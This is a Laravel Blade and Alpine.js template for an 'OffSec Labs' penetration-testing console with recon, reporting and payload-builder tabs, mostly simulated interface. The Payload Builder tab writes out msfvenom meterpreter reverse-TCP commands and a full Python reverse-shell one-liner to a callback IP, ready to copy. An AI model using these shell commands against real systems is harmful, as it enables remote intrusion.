<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>OffSec Labs Console</title>

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Outfit:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">

    <!-- Styles & Scripts -->
    @vite(['resources/css/app.css', 'resources/js/app.js'])
    
    <style>
        :root {
            --font-brand: 'Outfit', sans-serif;
        }
        .console-page {
            background-color: #030303;
            color: #f0f0f5;
            font-family: Inter, system-ui, sans-serif;
            min-height: 100vh;
        }
        .console-glass {
            background: rgba(15, 15, 20, 0.7);
            border: 1px solid rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-radius: 12px;
        }
        .console-nav-active {
            color: #8b5cf6 !important;
            border-bottom: 2px solid #8b5cf6;
        }
    </style>
</head>
<body class="antialiased">
    <div class="console-page flex flex-col justify-between" x-data="{ currentTab: 'dashboard', userMenuOpen: false }">
        <!-- Top Navigation -->
        <header class="bg-[#0a0a0f]/80 backdrop-blur-xl border-b border-white/[0.06] sticky top-0 z-50">
            <div class="container mx-auto max-w-7xl px-4 sm:px-6 h-16 flex items-center justify-between">
                <!-- Logo -->
                <div class="flex items-center gap-8">
                    <a href="/" class="group flex items-center gap-2.5 select-none text-decoration-none">
                        <span class="flex shrink-0 items-center justify-center rounded-[10px] w-8 h-8 bg-gradient-to-br from-[#8b5cf6] to-[#3b82f6] shadow-[0_2px_8px_-2px_rgba(139,92,246,0.55)]">
                            <svg class="size-4.5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
                                <polyline points="4 17 10 11 4 5" />
                                <line x1="12" y1="19" x2="20" y2="19" />
                            </svg>
                        </span>
                        <span class="text-white font-[700] tracking-[-0.03em] leading-none text-lg" style="font-family: var(--font-brand);">
                            OffSec Labs
                        </span>
                    </a>

                    <!-- Nav Tabs -->
                    <nav class="hidden md:flex items-center gap-6 h-16">
                        <button @click="currentTab = 'dashboard'" :class="{ 'console-nav-active text-white': currentTab === 'dashboard' }" class="h-full border-0 bg-transparent text-zinc-400 font-medium text-sm px-1 cursor-pointer transition-colors hover:text-white">Console Hub</button>
                        <button @click="currentTab = 'recon'" :class="{ 'console-nav-active text-white': currentTab === 'recon' }" class="h-full border-0 bg-transparent text-zinc-400 font-medium text-sm px-1 cursor-pointer transition-colors hover:text-white">Recon Tool</button>
                        <button @click="currentTab = 'reporting'" :class="{ 'console-nav-active text-white': currentTab === 'reporting' }" class="h-full border-0 bg-transparent text-zinc-400 font-medium text-sm px-1 cursor-pointer transition-colors hover:text-white">Reporting</button>
                        <button @click="currentTab = 'payload'" :class="{ 'console-nav-active text-white': currentTab === 'payload' }" class="h-full border-0 bg-transparent text-zinc-400 font-medium text-sm px-1 cursor-pointer transition-colors hover:text-white">Payload Builder</button>
                    </nav>
                </div>

                <!-- User Dropdown Menu -->
                <div class="relative">
                    <button @click="userMenuOpen = !userMenuOpen" @click.away="userMenuOpen = false" class="flex items-center gap-2 px-3 py-1.5 rounded-lg border border-white/10 bg-white/[0.02] text-sm text-zinc-300 hover:text-white transition-colors cursor-pointer">
                        <span>{{ Auth::user()->name }}</span>
                        <svg class="size-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
                    </button>
                    
                    <div x-show="userMenuOpen" style="display: none;" class="absolute right-0 mt-2 w-48 rounded-lg border border-white/10 bg-[#0e0e12] p-1.5 shadow-xl">
                        <a href="/profile" class="flex w-full items-center px-3 py-2 text-xs text-zinc-400 hover:text-white hover:bg-white/[0.04] rounded-md text-decoration-none">
                            Profile Settings
                        </a>
                        <div class="border-t border-white/5 my-1"></div>
                        <form method="POST" action="{{ route('logout') }}">
                            @csrf
                            <button type="submit" class="flex w-full items-center border-0 bg-transparent text-left px-3 py-2 text-xs text-red-400 hover:bg-red-950/20 rounded-md cursor-pointer">
                                Log Out
                            </button>
                        </form>
                    </div>
                </div>
            </div>
        </header>

        <!-- Main Body -->
        <main class="flex-grow container mx-auto max-w-7xl px-4 sm:px-6 py-8">
            
            <!-- tab: HUB / DASHBOARD -->
            <div x-show="currentTab === 'dashboard'" class="space-y-6">
                <div>
                    <h1 class="text-2xl font-bold tracking-tight text-white" style="font-family: var(--font-brand);">Console Hub</h1>
                    <p class="text-sm text-zinc-400 mt-1">Consolidated security app launcher. Click any app module to launch.</p>
                </div>

                <!-- Apps Grid -->
                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                    <!-- App 1: Recon Tool -->
                    <div @click="currentTab = 'recon'" class="console-glass p-5 flex flex-col justify-between hover:border-purple-500/40 hover:shadow-[0_4px_30px_rgba(139,92,246,0.05)] transition-all duration-300 cursor-pointer group">
                        <div>
                            <div class="size-9 rounded-lg flex items-center justify-center bg-purple-500/10 border border-purple-500/20 text-purple-400 mb-4 group-hover:scale-105 transition-transform">
                                <svg class="size-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8" /><line x1="21" y1="21" x2="16.65" y2="16.65" /></svg>
                            </div>
                            <h3 class="text-base font-semibold text-white mb-2">Reconnaissance Suite</h3>
                            <p class="text-xs text-zinc-400 leading-relaxed">Automate subdomain enumeration, catalog hosts, scan ports, and gather passive DNS intelligence in seconds.</p>
                        </div>
                        <div class="flex items-center gap-1.5 text-xs text-purple-400 font-medium pt-5">
                            Launch Module <svg class="size-3.5 group-hover:translate-x-0.5 transition-transform" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>
                        </div>
                    </div>

                    <!-- App 2: OffSec Reporting -->
                    <div @click="currentTab = 'reporting'" class="console-glass p-5 flex flex-col justify-between hover:border-blue-500/40 hover:shadow-[0_4px_30px_rgba(59,130,246,0.05)] transition-all duration-300 cursor-pointer group">
                        <div>
                            <div class="size-9 rounded-lg flex items-center justify-center bg-blue-500/10 border border-blue-500/20 text-blue-400 mb-4 group-hover:scale-105 transition-transform">
                                <svg class="size-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" /><polyline points="14 2 14 8 20 8" /></svg>
                            </div>
                            <h3 class="text-base font-semibold text-white mb-2">OffSec Reporting</h3>
                            <p class="text-xs text-zinc-400 leading-relaxed">Professional pentesting reporting. Input vulnerability logs, compute CVSS vectors dynamically, and export executive PDFs.</p>
                        </div>
                        <div class="flex items-center gap-1.5 text-xs text-blue-400 font-medium pt-5">
                            Launch Module <svg class="size-3.5 group-hover:translate-x-0.5 transition-transform" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>
                        </div>
                    </div>

                    <!-- App 3: Payload Builder -->
                    <div @click="currentTab = 'payload'" class="console-glass p-5 flex flex-col justify-between hover:border-cyan-500/40 hover:shadow-[0_4px_30px_rgba(6,182,212,0.05)] transition-all duration-300 cursor-pointer group">
                        <div>
                            <div class="size-9 rounded-lg flex items-center justify-center bg-cyan-500/10 border border-cyan-500/20 text-cyan-400 mb-4 group-hover:scale-105 transition-transform">
                                <svg class="size-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" /></svg>
                            </div>
                            <h3 class="text-base font-semibold text-white mb-2">Payload Builder</h3>
                            <p class="text-xs text-zinc-400 leading-relaxed">Generate binary exploits, reverse shells, web shells, and trigger commands directly copy-pasteable for your terminals.</p>
                        </div>
                        <div class="flex items-center gap-1.5 text-xs text-cyan-400 font-medium pt-5">
                            Launch Module <svg class="size-3.5 group-hover:translate-x-0.5 transition-transform" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>
                        </div>
                    </div>
                </div>

                <!-- Recent Activities Logs -->
                <div class="console-glass p-5">
                    <h3 class="text-sm font-semibold text-white mb-3">Live Session Logs</h3>
                    <div class="space-y-2.5 font-mono text-xs">
                        <div class="flex items-start gap-3">
                            <span class="text-purple-400 shrink-0">[14:24:08]</span>
                            <span class="text-zinc-400">User logged in from IP 192.168.1.142 (Firefox macOS)</span>
                        </div>
                        <div class="flex items-start gap-3">
                            <span class="text-emerald-400 shrink-0">[12:10:45]</span>
                            <span class="text-zinc-400">Recon sweep completed for target domain: <strong class="text-white">internal-dc.local</strong></span>
                        </div>
                        <div class="flex items-start gap-3">
                            <span class="text-blue-400 shrink-0">[09:05:12]</span>
                            <span class="text-zinc-400">PDF Report exported: <strong class="text-white">OffSec_Internal_Audit_Q2.pdf</strong></span>
                        </div>
                    </div>
                </div>
            </div>

            <!-- tab: RECON TOOL -->
            <div x-show="currentTab === 'recon'" style="display: none;" class="space-y-6" 
                 x-data="{ targetDomain: 'target.local', scanning: false, scanProgress: 0, logs: [] }">
                <div class="flex justify-between items-center">
                    <div>
                        <h1 class="text-2xl font-bold tracking-tight text-white" style="font-family: var(--font-brand);">Reconnaissance Suite</h1>
                        <p class="text-sm text-zinc-400 mt-1">Map hosts, discover IP blocks, and scan ports.</p>
                    </div>
                    <button @click="currentTab = 'dashboard'" class="text-xs text-zinc-400 hover:text-white border-0 bg-transparent cursor-pointer flex items-center gap-1">
                        <svg class="size-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg> Back to Hub
                    </button>
                </div>

                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
                    <!-- Control panel -->
                    <div class="console-glass p-5 h-fit space-y-4">
                        <h3 class="text-sm font-semibold text-white">Target Scan Config</h3>
                        <div class="space-y-1.5">
                            <label class="text-xs text-zinc-400 font-medium">Domain or Host IP</label>
                            <input type="text" x-model="targetDomain" :disabled="scanning" class="w-full bg-zinc-950 border border-white/10 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-purple-500 focus:ring-1 focus:ring-purple-500">
                        </div>
                        <div class="space-y-1.5">
                            <label class="text-xs text-zinc-400 font-medium">Scan Intensity</label>
                            <select class="w-full bg-zinc-950 border border-white/10 rounded-lg px-3 py-2 text-sm text-zinc-400 focus:outline-none focus:border-purple-500 focus:ring-1 focus:ring-purple-500">
                                <option>Passive DNS Cataloging</option>
                                <option>Active Port Discovery (Top 100)</option>
                                <option>Full Vulnerability Audit</option>
                            </select>
                        </div>
                        <button @click="
                            if(!scanning) {
                                scanning = true;
                                scanProgress = 0;
                                logs = ['[!] Launching recon sweep against: ' + targetDomain];
                                let intv = setInterval(() => {
                                    scanProgress += 10;
                                    if(scanProgress === 10) logs.push('[*] Querying WHOIS database for registrar listings...');
                                    if(scanProgress === 30) logs.push('[*] DNS Check: Found A Record mapping to 10.10.12.84');
                                    if(scanProgress === 50) logs.push('[*] Launching TCP port scan against: 10.10.12.84');
                                    if(scanProgress === 75) logs.push('[+] Port 22/tcp (SSH) open. SSH-2.0-OpenSSH_8.2p1');
                                    if(scanProgress === 85) logs.push('[+] Port 80/tcp (HTTP) open. Apache/2.4.41 Ubuntu');
                                    if(scanProgress === 100) {
                                        logs.push('[+] Recon scan completed successfully. Output logged!');
                                        scanning = false;
                                        clearInterval(intv);
                                    }
                                }, 500);
                            }
                        " :disabled="scanning" class="w-full bg-purple-600 text-white rounded-lg py-2.5 font-semibold text-sm border-none shadow-[0_2px_8px_-2px_rgba(139,92,246,0.4)] hover:brightness-110 transition-all cursor-pointer flex items-center justify-center gap-2">
                            <span x-show="!scanning">Execute Sweep</span>
                            <span x-show="scanning" style="display: none;">Scanning... <span x-text="scanProgress + '%'"></span></span>
                        </button>
                    </div>

                    <!-- Console logs panel -->
                    <div class="lg:col-span-2 console-glass p-5 flex flex-col justify-between" style="min-height: 320px;">
                        <div>
                            <div class="flex justify-between items-center mb-4 border-b border-white/5 pb-2">
                                <h3 class="text-sm font-semibold text-white">Console Output Feed</h3>
                                <div class="flex gap-1.5">
                                    <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
                                    <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
                                    <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
                                </div>
                            </div>
                            
                            <div class="font-mono text-xs text-emerald-400 space-y-2 h-[200px] overflow-y-auto leading-relaxed text-left">
                                <template x-for="log in logs">
                                    <div x-text="log"></div>
                                </template>
                                <div x-show="scanning" class="inline-block w-1.5 h-3.5 bg-emerald-400 animate-pulse align-middle ml-0.5"></div>
                                <div x-show="logs.length === 0" class="text-zinc-500">Console idle. Configure options and click Execute Sweep.</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- tab: REPORTING -->
            <div x-show="currentTab === 'reporting'" style="display: none;" class="space-y-6"
                 x-data="{ findings: [
                    { id: 1, title: 'SQL Injection in /api/profile', severity: 'Critical', cvss: '9.8' },
                    { id: 2, title: 'Weak Kerberos Encryption Enabled', severity: 'High', cvss: '8.1' }
                 ], newTitle: '', newSeverity: 'High', newCvss: '8.0' }">
                <div class="flex justify-between items-center">
                    <div>
                        <h1 class="text-2xl font-bold tracking-tight text-white" style="font-family: var(--font-brand);">OffSec Reporting</h1>
                        <p class="text-sm text-zinc-400 mt-1">Input vulnerabilities and generate structured security reports.</p>
                    </div>
                    <button @click="currentTab = 'dashboard'" class="text-xs text-zinc-400 hover:text-white border-0 bg-transparent cursor-pointer flex items-center gap-1">
                        <svg class="size-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg> Back to Hub
                    </button>
                </div>

                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
                    <!-- Left Add Finding Form -->
                    <div class="console-glass p-5 space-y-4 h-fit">
                        <h3 class="text-sm font-semibold text-white">Add Finding</h3>
                        <div class="space-y-1.5">
                            <label class="text-xs text-zinc-400 font-medium">Finding Title</label>
                            <input type="text" x-model="newTitle" placeholder="e.g. CSRF in Transfer API" class="w-full bg-zinc-950 border border-white/10 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500">
                        </div>
                        <div class="grid grid-cols-2 gap-3">
                            <div class="space-y-1.5">
                                <label class="text-xs text-zinc-400 font-medium">Severity</label>
                                <select x-model="newSeverity" class="w-full bg-zinc-950 border border-white/10 rounded-lg px-2 py-2 text-sm text-zinc-400 focus:outline-none">
                                    <option>Critical</option>
                                    <option>High</option>
                                    <option>Medium</option>
                                    <option>Low</option>
                                </select>
                            </div>
                            <div class="space-y-1.5">
                                <label class="text-xs text-zinc-400 font-medium">CVSS Score</label>
                                <input type="text" x-model="newCvss" class="w-full bg-zinc-950 border border-white/10 rounded-lg px-3 py-2 text-sm text-white focus:outline-none">
                            </div>
                        </div>
                        <button @click="
                            if(newTitle.trim()) {
                                findings.push({ id: Date.now(), title: newTitle, severity: newSeverity, cvss: newCvss });
                                newTitle = '';
                            }
                        " class="w-full bg-blue-600 text-white rounded-lg py-2.5 font-semibold text-sm border-none shadow-[0_2px_8px_-2px_rgba(59,130,246,0.4)] hover:brightness-110 transition-all cursor-pointer">
                            Log Finding
                        </button>
                    </div>

                    <!-- Right Findings List & Export -->
                    <div class="lg:col-span-2 console-glass p-5 flex flex-col justify-between" style="min-height: 350px;">
                        <div class="space-y-4">
                            <div class="border-b border-white/5 pb-2 flex justify-between items-center">
                                <h3 class="text-sm font-semibold text-white">Vulnerability Findings Draft</h3>
                                <span class="text-xs text-zinc-400" x-text="findings.length + ' findings listed'"></span>
                            </div>

                            <div class="space-y-2.5 max-h-[220px] overflow-y-auto pr-1">
                                <template x-for="finding in findings" :key="finding.id">
                                    <div class="flex items-center justify-between p-3 rounded-lg border border-white/5 bg-white/[0.01] hover:bg-white/[0.02]">
                                        <div class="flex items-center gap-3">
                                            <span :class="{
                                                'bg-red-500/10 text-red-400 border-red-500/20': finding.severity === 'Critical',
                                                'bg-orange-500/10 text-orange-400 border-orange-500/20': finding.severity === 'High',
                                                'bg-yellow-500/10 text-yellow-400 border-yellow-500/20': finding.severity === 'Medium',
                                                'bg-green-500/10 text-green-400 border-green-500/20': finding.severity === 'Low',
                                            }" class="text-[10px] font-bold px-2 py-0.5 rounded border" x-text="finding.severity"></span>
                                            <span class="text-xs text-white" x-text="finding.title"></span>
                                        </div>
                                        <div class="flex items-center gap-3">
                                            <span class="text-xs font-mono text-zinc-400" x-text="'CVSS ' + finding.cvss"></span>
                                            <button @click="findings = findings.filter(f => f.id !== finding.id)" class="text-zinc-500 hover:text-red-400 border-0 bg-transparent cursor-pointer">
                                                <svg class="size-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                                            </button>
                                        </div>
                                    </div>
                                </template>
                            </div>
                        </div>

                        <div class="pt-5 border-t border-white/5 flex justify-end">
                            <button @click="alert('Exporting findings into PDF report...')" class="bg-gradient-to-r from-blue-600 to-violet-600 text-white rounded-lg px-5 py-2 font-semibold text-xs border-none cursor-pointer hover:brightness-110 transition-all">
                                Export PDF Report
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- tab: PAYLOAD BUILDER -->
            <div x-show="currentTab === 'payload'" style="display: none;" class="space-y-6"
                 x-data="{ targetOs: 'Windows', payloadType: 'Reverse TCP', callbackIp: '10.10.14.2', callbackPort: '4444', 
                     getCommand() {
                         if(targetOs === 'Windows') {
                             return 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=' + callbackIp + ' LPORT=' + callbackPort + ' -f exe -o shell.exe';
                         } else if(targetOs === 'Linux') {
                             return 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=' + callbackIp + ' LPORT=' + callbackPort + ' -f elf -o shell.elf';
                         } else {
                             return 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0022' + callbackIp + '\u0022,' + callbackPort + '));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0022/bin/sh\u0022]);\'';
                         }
                     }
                 }">
                <div class="flex justify-between items-center">
                    <div>
                        <h1 class="text-2xl font-bold tracking-tight text-white" style="font-family: var(--font-brand);">Payload Builder</h1>
                        <p class="text-sm text-zinc-400 mt-1">Configure and generate standard listener shellcodes.</p>
                    </div>
                    <button @click="currentTab = 'dashboard'" class="text-xs text-zinc-400 hover:text-white border-0 bg-transparent cursor-pointer flex items-center gap-1">
                        <svg class="size-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg> Back to Hub
                    </button>
                </div>

                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
                    <!-- Configurator form -->
                    <div class="console-glass p-5 space-y-4 h-fit">
                        <h3 class="text-sm font-semibold text-white">Payload Settings</h3>
                        <div class="space-y-1.5">
                            <label class="text-xs text-zinc-400 font-medium">Target OS</label>
                            <select x-model="targetOs" class="w-full bg-zinc-950 border border-white/10 rounded-lg px-3 py-2 text-sm text-zinc-400 focus:outline-none">
                                <option>Windows</option>
                                <option>Linux</option>
                                <option>Python (Universal)</option>
                            </select>
                        </div>
                        <div class="grid grid-cols-2 gap-3">
                            <div class="space-y-1.5">
                                <label class="text-xs text-zinc-400 font-medium">LHOST (IP)</label>
                                <input type="text" x-model="callbackIp" class="w-full bg-zinc-950 border border-white/10 rounded-lg px-3 py-2 text-xs text-white focus:outline-none">
                            </div>
                            <div class="space-y-1.5">
                                <label class="text-xs text-zinc-400 font-medium">LPORT (Port)</label>
                                <input type="text" x-model="callbackPort" class="w-full bg-zinc-950 border border-white/10 rounded-lg px-3 py-2 text-xs text-white focus:outline-none">
                            </div>
                        </div>
                    </div>

                    <!-- Command preview -->
                    <div class="lg:col-span-2 console-glass p-5 flex flex-col justify-between" style="min-height: 250px;">
                        <div class="space-y-4">
                            <div class="border-b border-white/5 pb-2 flex justify-between items-center">
                                <h3 class="text-sm font-semibold text-white">Generated Shellcode</h3>
                                <span class="text-xs text-cyan-400 cursor-pointer" @click="navigator.clipboard.writeText(getCommand()); alert('Command copied to clipboard!')">Copy Command</span>
                            </div>

                            <div class="p-4 bg-zinc-950/80 rounded border border-zinc-900 font-mono text-xs text-cyan-400 whitespace-pre-wrap break-all leading-normal text-left" x-text="getCommand()"></div>
                        </div>

                        <div class="pt-5 border-t border-white/5 flex items-center justify-between text-xs text-zinc-500">
                            <span>* Ensure handler listener port is active on local machine before launching.</span>
                        </div>
                    </div>
                </div>
            </div>

        </main>

        <!-- Footer -->
        <footer class="w-full py-5 text-center text-xs text-zinc-500 border-t border-white/[0.05] bg-[#0a0a0f]/50">
            © 2026 Offensive Security Labs. Console Hub Dashboard.
        </footer>
    </div>
</body>
</html>
